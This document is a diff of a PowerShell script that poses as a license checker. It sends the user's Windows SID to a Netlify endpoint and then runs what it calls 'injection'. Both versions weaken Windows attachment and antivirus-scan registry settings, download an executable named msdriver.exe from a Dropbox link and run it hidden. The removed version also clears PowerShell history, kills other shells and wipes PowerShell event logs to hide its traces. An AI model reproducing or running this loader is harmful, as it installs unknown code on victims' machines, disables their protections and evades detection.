@@ -1,87 +1,55 @@
-# Force TLS 1.2 (required for Netlify HTTPS)
+# Set TLS
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# Step 1: Get current user's SID
+# Get SID
 try {
-    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    $sid = $user.User.Value
-    Write-Host "[-] Your SID: $sid"
+    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+    Write-Host "[-] SID: $sid"
 } catch {
-    Write-Host "[x] Failed to retrieve SID"
-    exit
+    Write-Host "[x] Failed to get SID"; exit
 }
 
-# Step 2: Call your Netlify API
+# Call API
 $apiUrl = "https://orphues2apix.netlify.app/.netlify/functions/checkSid?sid=$sid"
-
 try {
     $response = Invoke-RestMethod -Uri $apiUrl -Method Get
 } catch {
-    Write-Host "[x] Network Error: $_"
-    exit
+    Write-Host "[x] Network Error"; exit
 }
 
-# Step 3: Check response
+# Check result
 if ($response.success -eq $true) {
     Write-Host "[+] License Verified: $($response.message)"
     Write-Host "[+] License Key: $($response.key)"
-
-    # Step 4: Injection logic placeholder
-    Write-Host "[*] Proceeding with injection..."
-Stop-Process -Name "ctfmon" -Force -ErrorAction SilentlyContinue
-Start-Sleep -Milliseconds 500
-Start-Process "C:\Windows\System32\ctfmon.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 1
-
-$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
-$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
-
-Invoke-Expression $regCommand1 | Out-Null
-Invoke-Expression $regCommand2 | Out-Null
-
-Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
-
-$ctfmonRunning = Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue
-$discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
-if ($ctfmonRunning -and $discordRunning) {
-    $destination = "C:\Windows\System32\msdriver.exe"
-    $url = "https://dl.dropboxusercontent.com/scl/fi/8sr5ikslqkn4q81aoortf/msdriver.exe?rlkey=836a8lb540w926f2fzj9ew5vm&st=s5e7o6k5"
-    Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction SilentlyContinue
-    Start-Sleep -Seconds 2
-    Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
-}
-
-Clear-History
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
-if (Test-Path $historyPath) {
-    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
-}
-
-$attachmentsRegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"
-if (Test-Path $attachmentsRegKeyPath) {
-    Remove-Item -Path $attachmentsRegKeyPath -Recurse -Force | Out-Null
-}
-
-Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
-Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
-    if ($_.Parent.Id -ne $PID) {
-        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
+    
+    # Optional: restart ctfmon
+    try {
+        Stop-Process -Name "ctfmon" -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Milliseconds 500
+        Start-Process "C:\Windows\System32\ctfmon.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    } catch {
+        Write-Host "[!] ctfmon restart failed: $_"
     }
-}
 
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
-if (-not (Test-Path $historyPath)) {
-    New-Item -Path $historyPath -ItemType File -Force | Out-Null
-} else {
-    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
-}
+    # Change registry (requires admin)
+    try {
+        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v SaveZoneInformation /t REG_DWORD /d 2 /f | Out-Null
+        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v ScanWithAntiVirus /t REG_DWORD /d 2 /f | Out-Null
+    } catch {
+        Write-Host "[!] Registry changes failed"
+    }
 
-wevtutil el | Where-Object { $_ -match "PowerShell" } | ForEach-Object { wevtutil cl "$_" }
-
-Exit
+    # Optional: Download executable
+    $destination = "$env:TEMP\msdriver.exe"
+    $url = "https://dl.dropboxusercontent.com/scl/fi/8sr5ikslqkn4q81aoortf/msdriver.exe?rlkey=836a8lb540w926f2fzj9ew5vm&st=s5e7o6k5"
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
+        Start-Sleep -Seconds 2
+        Start-Process -FilePath $destination -WindowStyle Hidden
+    } catch {
+        Write-Host "[!] Failed to download or run payload"
+    }
 
 } else {
     Write-Host "[x] License Check Failed: $($response.message)"
-    Write-Host "[*] You can retry or contact support."
-    # Do not exit here; script continues
 }
